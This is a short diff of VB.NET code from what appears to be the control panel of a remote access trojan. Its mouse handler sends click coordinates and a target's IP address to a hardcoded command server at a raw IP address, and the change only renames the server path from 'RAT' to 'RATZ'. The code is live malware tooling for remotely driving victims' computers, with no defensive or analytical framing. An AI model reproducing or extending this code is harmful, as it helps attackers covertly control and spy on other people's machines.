@@ -136,13 +136,13 @@ displayimage:
     Private Sub Render_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Render.Click
         If e.Button = MouseButtons.Right Then
             If remotecontrol.Checked Then
-                sendcords.DownloadString("http://185.62.188.189/RAT/" & "clients.php?action=sendcords&target=" & targetIp & "&actioncontent=" & xPosRemote & "&actioncontent2=" & yPosRemote & "&actioncontent3=" & 3)
+                sendcords.DownloadString("http://185.62.188.189/RATZ/" & "clients.php?action=sendcords&target=" & targetIp & "&actioncontent=" & xPosRemote & "&actioncontent2=" & yPosRemote & "&actioncontent3=" & 3)
             End If
         End If
 
         If e.Button = MouseButtons.Left Then
             If remotecontrol.Checked Then
-                sendcords.DownloadString("http://185.62.188.189/RAT/" & "clients.php?action=sendcords&target=" & targetIp & "&actioncontent=" & xPosRemote & "&actioncontent2=" & yPosRemote & "&actioncontent3=" & 1)
+                sendcords.DownloadString("http://185.62.188.189/RATZ/" & "clients.php?action=sendcords&target=" & targetIp & "&actioncontent=" & xPosRemote & "&actioncontent2=" & yPosRemote & "&actioncontent3=" & 1)
             End If
         End If
 
